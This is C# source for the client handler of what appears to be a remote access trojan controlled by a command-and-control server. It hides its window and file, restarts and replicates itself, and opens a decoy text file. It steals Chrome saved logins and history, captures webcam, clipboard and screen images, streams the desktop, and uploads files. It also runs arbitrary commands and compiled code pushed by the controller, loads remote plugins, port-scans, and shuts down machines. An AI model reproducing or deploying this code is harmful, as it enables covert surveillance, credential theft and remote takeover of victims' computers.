using Library;
using Microsoft.CSharp;
using PluginManager;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data.SQLite;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Speech.Synthesis;
using System.Text;
using System.Windows.Forms;

namespace ClientHandler
{
    public delegate void OnFileEventDelegate(object sender, FileSystemEventArgs e);
    public delegate void OnCommandDelegate(object sender, CommandEventArgs e);
    public delegate void OnAuthorizedHandler(object sender, AuthEventArgs e);

    public class Handler
    {
        public enum EBrowser { Chrome, IE }

        public PluginHandler PluginHandler { get; private set; }
        public TransmitterStatus TransmitterStatus { get; set; }
        public Transmitter Transmitter { get; set; }
        public FileDirHandler FileDirInfo { get; private set; }
        public string AppDir { get; private set; }
        public string DirTransfers { get; private set; }
        public string DirPlugins { get; private set; }
        public Assembly Assembly { get; private set; }

        public event OnFileEventDelegate OnFileEvent;
        public event OnCommandDelegate OnCommandEvent;
        public event OnAuthorizedHandler OnAuthorizedEvent;

        private FileSystemWatcher watcher;
        private bool isAuthorized = false;
        private static readonly string APPDIR_TRANSFERS = "Transfers";
        private static readonly string APPDIR_PLUGINS = "Plugins";
        private int CONNECTION_TIMEOUT = 10000;
        private int CONNECTION_INTERVAL = 10000;
        private Timer transmitTimer;
        private int transmitTimerInterval = 1000;
        private Timer connectTimer;
        private Timer streamDesktopTimer;

        #region Singleton
        private static Handler instance;

        public static Handler Instance
        {
            get
            {
                lock (typeof(Handler))
                {
                    if (instance == null)
                    {
                        instance = new Handler();
                    }
                    return instance;
                }
            }
        }

        private Handler()
        {
            FileDirInfo = new FileDirHandler();
            watcher = new FileSystemWatcher();
            Worker = new JobWorker();
        }
        #endregion

        public void StartExceptionHandling()
        {
            Application.ThreadExit += Application_ThreadExit;
            Application.ThreadException += Application_ThreadException;
            Application.ApplicationExit += Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit += CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
        }

        public void StopExceptionHandling()
        {
            Application.ThreadExit -= Application_ThreadExit;
            Application.ThreadException -= Application_ThreadException;
            Application.ApplicationExit -= Application_ApplicationExit;
            AppDomain.CurrentDomain.ProcessExit -= CurrentDomain_ProcessExit;
            AppDomain.CurrentDomain.UnhandledException -= CurrentDomain_UnhandledException;
        }

        public Process Restart(string filename)
        {
            Process process = new Process();
            process.StartInfo.FileName = filename;
            process.EnableRaisingEvents = true;
            process.Start();
            //process.Disposed += LaunchIfCrashed;
            process.Exited += Application_ApplicationExit;
            return process;
        }

        /// <summary>
        /// Watches root dir (usually C:\)
        /// </summary>
        public void StartDirectoryWatcher()
        {
            StartDirectoryWatcher(Directory.GetDirectoryRoot(Environment.CurrentDirectory), "*.*", true);
        }

        public void StartDirectoryWatcher(string directory, string filter, bool includeSubdirectories)
        {
            watcher = new FileSystemWatcher(directory, filter);
            watcher.Path = directory;
            watcher.Filter = filter;
            watcher.NotifyFilter =
                NotifyFilters.Attributes |
                NotifyFilters.CreationTime |
                NotifyFilters.DirectoryName |
                NotifyFilters.FileName |
                NotifyFilters.LastAccess |
                NotifyFilters.LastWrite |
                NotifyFilters.Security |
                NotifyFilters.Size;
            watcher.IncludeSubdirectories = includeSubdirectories;
            watcher.Changed += watcher_Changed;
            watcher.Created += watcher_Created;
            watcher.Deleted += watcher_Deleted;
            watcher.Renamed += watcher_Renamed;
            watcher.EnableRaisingEvents = true;
        }

        public void StopDirectoryWatcher()
        {
            watcher.EnableRaisingEvents = false;
        }

        private void Replicate(bool askConfirmation = false)
        {
            DialogResult dr = DialogResult.Yes;
            if (askConfirmation)
            {
                dr = MessageBox.Show("Replicate?", "Replicate?", MessageBoxButtons.YesNo, MessageBoxIcon.Question, MessageBoxDefaultButton.Button1);
            }
            if (dr == DialogResult.Yes)
            {
                Replicator.Instance.Replicate();
            }
        }

        void HandleExit(String msg)
        {
            Application.Restart();
        }

        private void HandleWatcher(FileSystemEventArgs e)
        {
            //MessageBox.Show("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            //Console.WriteLine("Event: " + e.ChangeType + ", File/Dir: " + e.Name);
            FileDirInfo.CreateFileDirInfoEntry(e);
            OnFileEvent(this, e);
        }

        #region Watcher Events
        void watcher_Created(object sender, FileSystemEventArgs e)
        {
            //fdh.CreateFileDirInfoEntry(e);
            HandleWatcher(e);
        }

        void watcher_Changed(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Renamed(object sender, RenamedEventArgs e)
        {
            HandleWatcher(e);
        }

        void watcher_Deleted(object sender, FileSystemEventArgs e)
        {
            HandleWatcher(e);
        }
        #endregion


        #region Exception Events
        void Application_ThreadExit(object sender, EventArgs e)
        {
            HandleExit("Application: Thread Exit! Restarting...");
        }

        void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            HandleExit("Application: Thread Exception! Restarting...");
        }

        void Application_ApplicationExit(object sender, EventArgs e)
        {
            HandleExit("Application: Application Exit! Restarting...");
        }

        void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            HandleExit("Domain: Unhandled Exception! Restarting...");
        }

        void CurrentDomain_ProcessExit(object sender, EventArgs e)
        {
            HandleExit("Domain: Process Exit! Restarting...");
        }
        #endregion



        public List<string> GetBrowserHistory(EBrowser browser, string historyFile)
        {
            SQLiteConnection conn = new SQLiteConnection(@"Data Source=" + historyFile);
            conn.Open();
            SQLiteCommand cmd = new SQLiteCommand();
            cmd.Connection = conn;
            //  cmd.CommandText = "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;";
            //  Use the above query to get all the table names
            cmd.CommandText = "Select * From urls";
            SQLiteDataReader dr = cmd.ExecuteReader();
            while (dr.Read())
            {
                //MessageBox.Show(dr[1].ToString());
                Console.WriteLine(dr[1].ToString());
            }
            return null;
        }

        public void KillProcess()
        {
            try
            {
                var pid = -1;
                if (int.TryParse(Transmitter.TSettings.Parameters, out pid))
                {
                    if (pid >= 0)
                    {
                        var process = Process.GetProcessById(pid);
                        if (process != null)
                        {
                            process.Kill();
                        }
                    }
                }
                else
                {
                    var processes = Process.GetProcessesByName(Transmitter.TSettings.Parameters);
                    if (processes != null)
                    {
                        processes[0].Kill();
                    }
                }
            }
            catch (Exception ex)
            {
                // handle
            }
            StartWork(true);
        }

        public void UploadWebcamImage()
        {
            StartWork(true);
            long quality = 95;
            long.TryParse(Transmitter.TSettings.Parameters, out quality);
            var data = Imaging.BitmapToJpeg(WebcamControl.GetWebCamImage(), quality);
            UploadResult(data, "webcam.jpg", false, false, false);
        }

        public void UploadClipboardData()
        {
            if (Clipboard.ContainsText())
            {
                StartWork(true);
                UploadResult(Clipboard.GetText(), "clipboard.txt");
            }
            if (Clipboard.ContainsImage())
            {
                StartWork(true);
                long quality = 80;
                long.TryParse(Transmitter.TSettings.Parameters, out quality);
                var data = Imaging.BitmapToJpeg(Clipboard.GetImage(), quality);
                UploadResult(data, "clipboard.jpg", false, false, false);
            }
        }

        public void UploadDesktopImage()
        {
            StartWork(true);
            long quality = 80;
            long.TryParse(Transmitter.TSettings.Parameters, out quality);
            var data = Imaging.BitmapToJpeg(ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb), quality);
            UploadResult(data, "desktop.jpg", false, false, false);
        }

        string GetParsFormatted()
        {
            var inputSplit = Transmitter.TSettings.Parameters.Split(' ');
            var parsFormatted = "";
            for (int i = 0; i < inputSplit.Length; i++)
            {
                parsFormatted += inputSplit[i] + " ";
            }
            parsFormatted = parsFormatted.TrimEnd();
            return parsFormatted;
        }

        public void ExecuteCommand()
        {
            var dataToUpload = string.Empty;
            if (!String.IsNullOrEmpty(Transmitter.TSettings.Parameters))
            {
                var inputSplit = Transmitter.TSettings.Parameters.Split(' ');
                var fileName = inputSplit.Length > 0 ? inputSplit[0] : null;
                var fileArgs = GetParsFormatted();// "";
                //for (int i = 1; i < inputSplit.Length; i++)
                //{
                //    fileArgs += inputSplit[i] + " ";
                //}
                //fileArgs = fileArgs.TrimEnd();
                if (!string.IsNullOrEmpty(fileName))
                {
                    var hasExecuted = false;
                    try
                    {
                        RunProcess(fileName, fileArgs, AppDir, out dataToUpload);
                        hasExecuted = true;
                    }
                    catch (Exception ex)
                    {
                        hasExecuted = false;
                    }
                    if (!hasExecuted)
                    {
                        fileName = Path.Combine(DirTransfers, fileName);
                        RunProcess(fileName, fileArgs, DirTransfers, out dataToUpload);
                    }
                }
            }
            StartWork(true);
            UploadResult(dataToUpload, "result.txt");
        }

        private int RunProcess(string fileName, string fileArgs, string workingDir, out string result)
        {
            result = string.Empty;
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = fileName;
                psi.Arguments = fileArgs;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.WorkingDirectory = workingDir;
                var p = new Process();
                p.StartInfo = psi;
                p.Start();
                string output = p.StandardOutput.ReadToEnd();
                string err = p.StandardError.ReadToEnd();
                result = !string.IsNullOrEmpty(output) ? output : err;
                return p.ExitCode;
            }
            catch (Exception)
            {
                return -1;
            }
        }

        public void Initialize(HandlerInitData option)
        {
            this.Assembly = option.Assembly;
            this.CONNECTION_TIMEOUT = option.CONNECTION_TIMEOUT;
            this.CONNECTION_INTERVAL = option.CONNECTION_INTERVAL;
            if (option.HideOnStart)
            {
                HideForm(option.HostForm);
                File.SetAttributes(Assembly.Location, FileAttributes.Hidden | FileAttributes.NotContentIndexed);
            }
            Application.ApplicationExit += (o, e) =>
            {
                try
                {
                    Transmitter.DeAuthorize();
                }
                catch { }
                if (option.StartNewProcessOnExit)
                {
                    Replicate();
                }
            };
            SetupDirectories();
            //OpenFakeTextFile("Hey!");
            Transmitter = new Library.Transmitter(option.Url, option.APIKEY_PRIVATE, option.APIKEY_PUBLIC, CONNECTION_TIMEOUT);
            //var compHash = Transmitter.GetComputerHash(); Clipboard.SetText(compHash); MessageBox.Show(compHash);
            SetupConnectionTimer();
            //MinimizeFootPrint();
            PluginHandler = new PluginHandler((IPluginHost)option.HostForm, DirPlugins);
        }

        private void SetupDirectories()
        {
            AppDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), this.Assembly.GetName().Name);
            DirTransfers = Path.Combine(AppDir, APPDIR_TRANSFERS);
            DirPlugins = Path.Combine(AppDir, APPDIR_PLUGINS);
            //#if DEBUG
            //            DirPlugins = @"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\Debug";
            //#endif
            CreateDirectory(AppDir);
            CreateDirectory(DirTransfers);
            CreateDirectory(DirPlugins);
        }

        private void HideForm(Form hostForm)
        {
            hostForm.StartPosition = FormStartPosition.Manual;
            hostForm.DesktopLocation = new Point(Screen.PrimaryScreen.Bounds.Width + 10000, Screen.PrimaryScreen.Bounds.Y + 10000);
            hostForm.WindowState = FormWindowState.Minimized;
            hostForm.Opacity = 0;
            hostForm.ShowInTaskbar = false;
        }

        private void SetupConnectionTimer()
        {
            Debug.WriteLine("SetupConnectionTimer...");
            Debug.WriteLine("Trying to authorize...");
            isAuthorized = Transmitter.Authorize();
            Debug.WriteLine("Is authorized: " + isAuthorized);
            Debug.WriteLine("Setting up connection timer... Interval: " + CONNECTION_INTERVAL);
            connectTimer = new Timer();
            connectTimer.Interval = CONNECTION_INTERVAL;
            connectTimer.Tick += (o, e) =>
            {
                if (!isAuthorized)
                {
                    Debug.WriteLine("Trying to authorize...");
                    isAuthorized = Transmitter.Authorize();
                }
            };
            if (isAuthorized)
            {
                Debug.WriteLine("ConnectAndSetup...");
                ConnectAndSetup();
                connectTimer.Enabled = false;
            }
            else
            {
                connectTimer.Start();
            }
        }

        public void SetTransmissionInterval()
        {
            StartWork(true);
            var timeMS = Transmitter.TSettings.Parameters;
            int newInterval = 5000;
            if (int.TryParse(timeMS, out newInterval))
            {
                transmitTimerInterval = (newInterval >= 1000 && newInterval <= 24 * 60 * 60 * 1000) ? newInterval : transmitTimerInterval;
                transmitTimer.Interval = transmitTimerInterval;
            }
            UploadResult();
        }

        void ConnectAndSetup()
        {
            OnAuthorizedEvent(this, new AuthEventArgs()
            {
                IsAuthenticated = isAuthorized
            });
            //StartExceptionHandling();
            StartDirectoryWatcher();
            OnFileEvent += (o, e) =>
            {
                HandleFileEvent(e);
            };
            transmitTimer = new Timer();
            transmitTimer.Interval = transmitTimerInterval;
            transmitTimer.Tick += (o, e) =>
            {
                Transmitter.LoadSettings();
                if (Transmitter.TSettings == null)
                {
                    return;
                }
                //Transmitter.UpdateLastActive();
                OnCommandEvent(this, new CommandEventArgs()
                {
                    Command = Transmitter.TSettings.Command
                });
            };
            transmitTimer.Enabled = true;
        }

        private void CreateDirectory(string dir)
        {
            if (!Directory.Exists(dir))
            {
                try
                {
                    Directory.CreateDirectory(dir);
                }
                catch { }
            }
        }

        private int HandleFileEvent(FileSystemEventArgs e)
        {
            //MessageBox.Show(e.ChangeType + ", " + e.Name + ", " + e.FullPath);
            /*if (listBox2.InvokeRequired)
            {
                try
                {
                    SetTextCallback d = new SetTextCallback(HandleFileEvent);
                    this.Invoke(d, new object[] { e });
                }
                catch (ObjectDisposedException ex)
                {

                }
                return 1;
            }
            else
            {
                return listBox2.Items.Add(e.ChangeType + ", " + e.Name + ", " + e.FullPath);
            }*/
            return 0;
        }

        public bool RunElevated(string fileName)
        {
            //MessageBox.Show("Run: " + fileName);
            ProcessStartInfo processInfo = new ProcessStartInfo();
            processInfo.Verb = "runas";
            processInfo.FileName = fileName;
            try
            {
                Process.Start(processInfo);
                return true;
            }
            catch (Win32Exception)
            {
                //Do nothing. Probably the user canceled the UAC window
            }
            return false;
        }

        private string GetProgramName()
        {
            var process = Process.GetCurrentProcess();
            if (process != null)
            {
                return process.ProcessName;
            }
            return string.Empty;
        }

        [System.Runtime.InteropServices.DllImport("psapi.dll")]
        static extern int EmptyWorkingSet(IntPtr hwProc);

        public void MinimizeFootPrint()
        {
            EmptyWorkingSet(Process.GetCurrentProcess().Handle);
        }

        public JobWorker Worker { get; set; }

        public void ReportWork()
        {

        }

        public void StartWork(bool isDone = false)
        {
            if (Worker != null)
            {
                TransmitterStatus = TransmitterStatus.BUSY;
                Worker.Start();
                if (isDone)
                {
                    Worker.Stop();
                }
            }
        }

        public void StopWork(bool canUploadResult = true)
        {
            if (Worker != null)
            {
                TransmitterStatus = TransmitterStatus.IDLE;
                Worker.Stop();
                Transmitter.SetHasExectuted(Transmitter.TSettings);
            }
        }

        public void UploadPortInfo()
        {
            throw new NotImplementedException();
            //StringBuilder sb = new StringBuilder();
            //var piList = FirewallManager.Instance.GetPortInfo();
            //piList.ForEach((PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
            //StartWork(true);
            //UploadResult(sb.ToString(), "ports.txt");
        }

        public void UploadProcessInfo()
        {
            StringBuilder sb = new StringBuilder();
            foreach (var p in OS.GetProcesses())
            {
                sb.AppendLine("Name: " + p.Name + ", PID: " + p.PID);
            }
            StartWork(true);
            UploadResult(sb.ToString(), "processes.txt");
        }

        public void StopStreamDesktop()
        {
            StopWork(false);
            if (streamDesktopTimer != null)
            {
                streamDesktopTimer.Enabled = false;
                streamDesktopTimer.Stop();
            }
        }

        public void StreamDesktop()
        {
            StartWork(false);
            var interval = 5000;
            var quality = 10L;
            if (!string.IsNullOrEmpty(Transmitter.TSettings.Parameters))
            {
                var inputSplit = Transmitter.TSettings.Parameters.Split(';');
                if (inputSplit.Length >= 1)
                {
                    var intervalTemp = interval;
                    if (!int.TryParse(inputSplit[0], out intervalTemp))
                    {
                        interval = intervalTemp;
                    }
                }
                interval = interval >= 1000 && interval <= 10000 ? interval : 5000;
                if (inputSplit.Length >= 2)
                {
                    var qualityTemp = quality;
                    if (!long.TryParse(inputSplit[1], out qualityTemp))
                    {
                        quality = qualityTemp;
                    }
                }
            }
            streamDesktopTimer = new Timer();
            streamDesktopTimer.Interval = interval;
            streamDesktopTimer.Tick += (o, e) =>
            {
                var data = Imaging.BitmapToJpeg(ScreenMan.Instance.Grab(true, System.Drawing.Imaging.PixelFormat.Format24bppRgb), quality);
                UploadResult(data, "stream.jpg", false, false, false);
                //CursorInteract();
            };
            streamDesktopTimer.Enabled = true;
            streamDesktopTimer.Start();
        }

        //public void CursorInteract()
        //{
        //    //MessageBox.Show(Transmitter.TSettings.CursorX + ", " + Transmitter.TSettings.CursorY);
        //    HostForm.Cursor = new Cursor(Cursor.Current.Handle);
        //    Cursor.Position = new Point(Transmitter.TSettings.CursorX, Transmitter.TSettings.CursorY);
        //    string inputChar = Transmitter.TSettings.KeyCode;
        //    if (inputChar.Length > 0)
        //    {
        //        //MessageBox.Show(inputChar);
        //    }
        //    //Cursor.Clip = new Rectangle(HostForm.Location, HostForm.Size);
        //}

        public void UploadFileEvents()
        {
            StartWork(true);
            StringBuilder sb = new StringBuilder();
            FileDirInfo.FileDirInfoList.ForEach((FileDirInfo fdi) => sb.AppendLine(fdi.DateTime.ToString() + " " + fdi.FileInfo.ToString()));
            UploadResult(sb.ToString(), "fileevents.txt");
            FileDirInfo.FileDirInfoList.Clear();
        }

        public void DownloadFile()
        {
            StartWork(true);
            var path = String.Empty;
            byte[] data = Transmitter.DownloadFile();
            var filename = Transmitter.TSettings.Parameters;
            if (!string.IsNullOrEmpty(filename) && data != null)
            {
                try
                {
                    path = Path.Combine(DirTransfers, filename);
                    if (data != null)
                    {
                        SetupDirectories();
                        File.WriteAllBytes(path, data);
                    }
                }
                catch { }
            }
            UploadResult(data, path, false, false, false);
        }

        public void UploadFile()
        {
            StartWork(true);
            byte[] fileData = null;
            var fileName = String.Empty;
            var fileInfo = new FileInfo(Transmitter.TSettings.Parameters);
            if (fileInfo != null && fileInfo.Exists)
            {
                try
                {
                    fileName = fileInfo.Name;
                    fileData = File.ReadAllBytes(fileInfo.FullName);
                }
                catch { }
            }
            UploadResult(fileData, fileName, false, false, false);
        }

        //private void UploadFile(string path, int c = 0)
        //{
        //    if (!Transmitter.UploadFile(PatGetFileName(path), path) && c <= 1)
        //    {
        //        UploadFile(Transmitter.TSettings.FileToDownload, c + 1);
        //    }
        //    try
        //    {
        //        File.Delete(path);
        //    }
        //    catch (Exception ex) { }
        //}

        //private void CompressAndUploadFile(string fileFullPath)
        //{
        //    try
        //    {
        //        string fileName = Path.GetFileName(fileFullPath);
        //        string fileToUpload = dirDownloads + "\\" + fileName;
        //        if (Compression.Zip(fileFullPath, fileToUpload))
        //        {
        //            Transmitter.UploadFile(fileName, fileToUpload);
        //        }
        //        try
        //        {
        //            File.Delete(fileToUpload);
        //        }
        //        catch (Exception ex) { }
        //    }
        //    catch (Exception ex) { }
        //}

        public static void CopyStream(Stream input, Stream output)
        {
            byte[] buffer = new byte[8 * 1024];
            int len;
            while ((len = input.Read(buffer, 0, buffer.Length)) > 0)
            {
                output.Write(buffer, 0, len);
            }
        }

        public void UploadBrowserData()
        {
            StartWork(true);
            try
            {
                // Save Chrome Browser data
                string[] chromeFiles = new string[] {
                        "History",
                        "Login Data"
                    };
                var chromePath = @"\Google\Chrome\User Data\Default\";
                string[] zipFiles = new string[chromeFiles.Length];
                for (int i = 0; i < chromeFiles.Length; i++)
                {
                    zipFiles[i] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + chromeFiles[i];
                }
                UploadResult(Compression.Compress(zipFiles), "ChromeData.zip", false, false, false);
            }
            catch (Exception ex) { }
        }

        public bool OpenFakeTextFile(string message)
        {
            try
            {
                String tempDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                var fakeTextFilePath = Path.Combine(Environment.CurrentDirectory, PathExt.ReformatName(GetProgramName()) + ".txt");
                using (FileStream fs = new FileStream(fakeTextFilePath, FileMode.Create))
                {
                    using (StreamWriter sw = new StreamWriter(fs, Encoding.UTF8))
                    {
                        sw.WriteLine(message);
                        sw.Close();
                    }
                    fs.Close();
                }
                FileInfo fileInfo = new FileInfo(fakeTextFilePath);
                fileInfo.Attributes = FileAttributes.Hidden;
                ProcessStartInfo psi = new ProcessStartInfo("notepad.exe", fakeTextFilePath);
                psi.WindowStyle = ProcessWindowStyle.Maximized;
                psi.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                Process.Start(psi);
                return true;
            }
            catch (Exception ex) { return false; }
        }

        public void ExecuteCode()
        {
            ExecuteCodePvt();
            StartWork(true);
            UploadResult();
        }

        void ExecuteCodePvt()
        {
            string code = @"
using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
namespace Client
{
    public class Program
    {
        public static void Main()
        {
        " + Transmitter.TSettings.Parameters + @"
        }
    }
}
";

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = true;
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();
                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }
                Transmitter.UploadData("exception.txt", sb.ToString(), false);
            }
            try
            {
                Assembly assembly = results.CompiledAssembly;
                Type program = assembly.GetType("Client.Program");
                MethodInfo main = program.GetMethod("Main");
                main.Invoke(null, null);
            }
            catch (Exception ex)
            {
                Transmitter.UploadData("exception.txt", ex.ToString(), false);
            }
        }

        void UploadResult(object data = null, string outputFile = null, bool useCompression = false, bool isTextFile = true, bool canDisplayFileContents = true)
        {
            Transmitter.TSettings.OutputFile = outputFile;
            Transmitter.TSettings.CanDisplayFileContents = canDisplayFileContents;
            //Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(Worker.Result), useCompression);
            if (data != null && !string.IsNullOrEmpty(outputFile))
            {
                Transmitter.UploadData(outputFile, data, useCompression, isTextFile);
            }
        }

        public void UploadShares()
        {
            throw new NotImplementedException();
            //StringBuilder sb = new StringBuilder();
            //var piList = FirewallManager.Instance.GetShareInfo();
            //piList.ForEach((Library.ShareInfo si) => sb.AppendLine("Name: " + si.Name + ", Remark: " + si.Remark + ", Type: " + si.Type));
            //StartWork(true);
            //UploadResult(sb.ToString(), "shares.txt");
        }

        public void UploadLANComputers()
        {
            throw new NotImplementedException();
            //StringBuilder sb = new StringBuilder();
            //var piList = FirewallManager.Instance.GetLANComputers();
            //piList.ForEach((Library.LANComputerInfo lci) => sb.AppendLine("Name: " + lci.Name));
            //StartWork(true);
            //UploadResult(sb.ToString(), "lancomputers.txt");
        }

        public void UploadGatewayInfo()
        {
            throw new NotImplementedException();
            //StringBuilder sb = new StringBuilder();
            //var piList = FirewallManager.Instance.GetGetwayInfo();
            //piList.ForEach((Library.GatewayInfo i) => sb.AppendLine("Adapter description: " + i.AdapterDescription + ", Address: " + i.Address));
            //StartWork(true);
            //UploadResult(sb.ToString(), "gateways.txt");
        }

        public void UploadPortscan()
        {
            StartWork(false);
            var sbPorts = new StringBuilder();
            var ps = new PortScanner(Transmitter.TSettings.Parameters);
            var timer = new System.Windows.Forms.Timer();
            timer.Interval = 100;
            timer.Tick += (o, e) =>
            {
                if (ps != null)
                {
                    while (ps.ScanResults.Count > 0)
                    {
                        var scanResult = ps.ScanResults.Dequeue();
                        if (scanResult != null)
                        {
                            // Currently adds all ports (open and closed). Use scanResult.IsOpen to check if you only need open ports.
                            sbPorts.AppendLine(scanResult.ToString());
                        }
                    }
                    timer.Enabled = false;
                    sbPorts.AppendLine("Portscan finished!");
                    var data = sbPorts.ToString();
                    Worker.IsDone = true;
                    UploadResult(data, "portscan.txt");
                    //txtStatus.Text = "Port scan " + Math.Round(ps.PercentageDone, 0) + "%. Found: " + ps.FoundPorts.Count;
                }
            };
            timer.Enabled = true;
            //sbPorts.AppendLine((portInfo.EPortType == EPortType.TCP ? "TCP" : "UDP") + " Portscan initiated...");
            sbPorts.AppendLine("Portscan initiated...");
            sbPorts.AppendLine("Target: " + ps.Data.IPAddressString + ", Timeout: " + ps.PortTimeoutTreshold + ", Range: " + ps.Data.PortStart + " - " + ps.Data.PortEnd);
            ps.Start();
        }

        // http://www.computerhope.com/shutdown.htm
        public void Shutdown()
        {
            SystemPowerUtils.Shutdown();
            StartWork(true);
            UploadResult();
        }

        public void Restart()
        {
            SystemPowerUtils.Restart();
            StartWork(true);
            UploadResult();
        }

        public void Logoff()
        {
            SystemPowerUtils.Logoff();
            StartWork(true);
            UploadResult();
        }

        public void LockComputer()
        {
            SystemPowerUtils.LockComputer();
            StartWork(true);
            UploadResult();
        }

        public void Hibernate()
        {
            SystemPowerUtils.Hibernate();
            StartWork(true);
            UploadResult();
        }

        public void Sleep()
        {
            SystemPowerUtils.Sleep();
            StartWork(true);
            UploadResult();
        }

        public void ExecutePlugin()
        {
            StartWork(true);
            if (PluginHandler != null)
            {
                var data = PluginHandler.Execute(Transmitter.TSettings.File, Transmitter.TSettings.Parameters);
                if (data != null && data.Length > 0)
                {
                    SetupDirectories();
                    File.WriteAllBytes(Path.Combine(AppDir, "data.dat"), data);
                    UploadResult(data, "data.dat");
                }
            }
        }

        public void RemovePlugin()
        {
            StartWork(true);
            if (PluginHandler != null)
            {
                PluginHandler.Kill(Transmitter.TSettings.File);
            }
        }

        public void UploadPlugin()
        {
            StartWork(true);
            byte[] data = Transmitter.DownloadFile();
            if (data != null)
            {
                var path = DirPlugins;// Path.Combine(dirPlugins, Handler.Instance.Transmitter.TSettings.File);
                //File.WriteAllBytes(path, data);
                SetupDirectories();
                try
                {
                    Compression.Extract(data, path);
                }
                catch (Exception)
                {
                    // probably not a zip file
                }
            }
            if (PluginHandler != null)
            {
                PluginHandler.Reload(null);
            }
        }

        private void Speak()
        {
            StartWork(true);
            SpeechSynthesizer synthesizer = new SpeechSynthesizer();
            synthesizer.SelectVoiceByHints(VoiceGender.Female, VoiceAge.Adult);
            synthesizer.Volume = 100;  // 0...100
            synthesizer.Rate = -2;     // -10...10
            synthesizer.SpeakAsync(GetParsFormatted());
        }

        public void ExecuteCommand(ECommand command)
        {
            switch (command)
            {
                case ECommand.Speak:
                    Speak();
                    break;
                case ECommand.SysShutdown:
                    Shutdown();
                    break;
                case ECommand.SysRestart:
                    Restart();
                    break;
                case ECommand.SysLogoff:
                    Logoff();
                    break;
                case ECommand.SysLock:
                    LockComputer();
                    break;
                case ECommand.SysHibernate:
                    LockComputer();
                    break;
                case ECommand.SysSleep:
                    LockComputer();
                    break;
                case ECommand.Portscan:
                    UploadPortscan();
                    break;
                case ECommand.GetGateways:
                    UploadGatewayInfo();
                    break;
                case ECommand.GetLanComputers:
                    UploadLANComputers();
                    break;
                case ECommand.GetShares:
                    UploadShares();
                    break;
                case ECommand.SetTransmissionInterval:
                    SetTransmissionInterval();
                    break;
                case ECommand.GetDesktop:
                    UploadDesktopImage();
                    break;
                case ECommand.RunCommand:
                    ExecuteCommand();
                    break;
                case ECommand.GetClipboardData:
                    UploadClipboardData();
                    break;
                case ECommand.GetWebcam:
                    UploadWebcamImage();
                    break;
                case ECommand.GetPorts:
                    UploadPortInfo();
                    break;
                case ECommand.GetProcesses:
                    UploadProcessInfo();
                    break;
                case ECommand.GetChromeData:
                    UploadBrowserData();
                    break;
                case ECommand.GetFileEvents:
                    UploadFileEvents();
                    break;
                case ECommand.UploadFile:
                    // File retreived from C&C server
                    DownloadFile();
                    break;
                case ECommand.GetFile:
                    // File transmitted to C&C server
                    UploadFile();
                    break;
                case ECommand.StreamDesktop:
                    StreamDesktop();
                    break;
                case ECommand.StopStreamDesktop:
                    StopStreamDesktop();
                    break;
                //case ECommand.MOVE_CURSOR:
                //    CursorInteract();
                //    break;
                case ECommand.KillProcess:
                    KillProcess();
                    break;
                case ECommand.StartPlugin:
                    ExecutePlugin();
                    break;
                case ECommand.KillPlugin:
                    RemovePlugin();
                    break;
                case ECommand.UploadPlugin:
                    UploadPlugin();
                    break;
                case ECommand.RunCode:
                    ExecuteCode();
                    break;
            }
        }
    }
}
